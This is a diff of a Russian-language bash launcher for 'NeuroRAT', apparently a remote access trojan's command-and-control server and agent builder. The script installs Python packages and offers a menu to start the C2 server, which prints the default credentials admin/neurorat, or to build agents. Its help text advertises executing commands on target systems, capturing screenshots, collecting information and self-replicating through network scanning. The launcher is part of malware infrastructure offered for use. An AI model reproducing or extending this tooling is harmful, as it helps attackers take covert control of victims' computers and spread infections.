@@ -1,64 +1,79 @@
 #!/bin/bash
-# Запуск NeuroRAT C2 Server с API интеграцией
+# NeuroRAT C2 Server Startup Script
 
-# Цвета для вывода
-GREEN='\033[0;32m'
+# Определение цветов для вывода
 RED='\033[0;31m'
+GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
 NC='\033[0m' # No Color
 
-echo -e "${YELLOW}========== NeuroRAT C2 Server ===========${NC}"
-echo -e "${YELLOW}Автоматический запуск системы...${NC}"
+echo -e "${GREEN}"
+echo "  _   _                      ____      _  _____ "
+echo " | \ | | ___ _   _ _ __ ___ |  _ \    / \|_   _|"
+echo " |  \| |/ _ \ | | | '__/ _ \| |_) |  / _ \ | |  "
+echo " | |\  |  __/ |_| | | | (_) |  _ <  / ___ \| |  "
+echo " |_| \_|\___|\__,_|_|  \___/|_| \_\/_/   \_\_|  "
+echo -e "${NC}"
+echo -e "${YELLOW}C2 Server и Билдер${NC}"
+echo ""
 
-# Проверяем наличие Docker
-if ! command -v docker &> /dev/null; then
-    echo -e "${RED}Docker не установлен. Пожалуйста, установите Docker и Docker Compose.${NC}"
-    exit 1
-fi
+# Проверка зависимостей
+echo -e "${BLUE}[*] Проверка зависимостей...${NC}"
 
-# Проверяем наличие файлов API ключей
-if [ ! -f .env ]; then
-    echo -e "${YELLOW}Файл .env не найден, создаю из шаблона...${NC}"
-    cp .env.example .env
-    echo -e "${RED}⚠️  ВНИМАНИЕ: Не забудьте заполнить настоящие API ключи в файле .env!${NC}"
-fi
-
-# Создаем необходимые директории
-mkdir -p uploads logs credentials
-
-# Останавливаем существующие контейнеры
-echo -e "${YELLOW}Останавливаем существующие контейнеры...${NC}"
-docker-compose down
-
-# Собираем и запускаем систему
-echo -e "${YELLOW}Собираем и запускаем контейнеры...${NC}"
-docker-compose build && docker-compose up -d
-
-# Ждем, пока система запустится
-echo -e "${YELLOW}Ожидание запуска системы...${NC}"
-sleep 5
-
-# Проверяем статус контейнеров
-if docker ps | grep -q "neurorat-server"; then
-    echo -e "${GREEN}✅ NeuroRAT C2 Server успешно запущен!${NC}"
-    echo -e "${GREEN}✅ Веб-интерфейс доступен по адресу: http://localhost:8080${NC}"
-    
-    # Проверяем доступность API
-    if curl -s http://localhost:8080 > /dev/null; then
-        echo -e "${GREEN}✅ API сервер отвечает${NC}"
+check_dependency() {
+    if ! command -v $1 &> /dev/null; then
+        echo -e "${RED}[-] $2 не найден. Установите $2 для продолжения.${NC}"
+        exit 1
     else
-        echo -e "${RED}❌ API сервер не отвечает, проверьте логи${NC}"
+        echo -e "${GREEN}[+] $2 найден.${NC}"
     fi
-    
-    # Выводим логи для отладки
-    echo -e "${YELLOW}Последние логи:${NC}"
-    docker logs neurorat-server --tail 10
-else
-    echo -e "${RED}❌ Произошла ошибка при запуске системы${NC}"
-    echo -e "${YELLOW}Логи запуска:${NC}"
-    docker logs neurorat-server
-fi
+}
 
-echo -e "${YELLOW}=========================================${NC}"
-echo -e "${GREEN}Для остановки системы выполните: docker-compose down${NC}"
-echo -e "${GREEN}Для просмотра логов: docker logs -f neurorat-server${NC}" 
+check_dependency python3 "Python 3"
+check_dependency pip3 "pip3"
+
+# Установка Python зависимостей
+echo -e "${BLUE}[*] Установка Python зависимостей...${NC}"
+pip3 install fastapi uvicorn jinja2 python-multipart pillow psutil
+
+# Выбор режима запуска
+echo ""
+echo -e "${YELLOW}Выберите режим запуска:${NC}"
+echo "1) Запуск C2 сервера (стандартный режим)"
+echo "2) Только сборка агентов (билдер)"
+echo "3) Помощь и информация"
+
+read -p "Выберите опцию (1-3): " choice
+
+case $choice in
+  1)
+    echo -e "${GREEN}[+] Запуск C2 сервера...${NC}"
+    echo -e "${BLUE}[*] Сервер будет доступен по адресу http://localhost:8088${NC}"
+    echo -e "${BLUE}[*] Логин: admin / Пароль: neurorat${NC}"
+    python3 server_api.py
+    ;;
+  2)
+    echo -e "${GREEN}[+] Запуск билдера агентов...${NC}"
+    echo -e "${BLUE}[*] Выполняется настройка...${NC}"
+    # Запуск билдера в режиме без сервера
+    python3 server_api.py --builder-only
+    ;;
+  3)
+    echo -e "${BLUE}=== NeuroRAT C2 Server ====${NC}"
+    echo "Система управления и мониторинга конечных точек."
+    echo ""
+    echo "Возможности сервера:"
+    echo "- Мониторинг подключенных агентов"
+    echo "- Выполнение команд на целевых системах"
+    echo "- Сбор информации и захват скриншотов"
+    echo "- Создание кастомизированных агентов"
+    echo "- Саморепликация через сетевое сканирование"
+    echo ""
+    echo "Документация доступна в файле README.md"
+    ;;
+  *)
+    echo -e "${RED}[-] Неверный выбор. Выход.${NC}"
+    exit 1
+    ;;
+esac 
